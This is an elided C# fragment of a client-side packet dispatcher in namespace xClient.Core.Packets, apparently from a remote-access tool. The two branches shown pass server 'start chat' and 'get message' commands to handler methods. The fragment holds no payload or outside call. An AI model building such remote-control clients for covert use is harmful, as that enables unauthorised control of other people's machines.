...
namespace xClient.Core.Packets
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            ...
            else if (type == typeof(ServerPackets.DoStartChat))
            {
                CommandHandler.HandleDoStartChat((ServerPackets.DoStartChat)packet, client);
            }
            else if (type == typeof(ServerPackets.GetMessage))
            {
                CommandHandler.HandleGetMessages((ServerPackets.GetMessage)packet, client);
            }
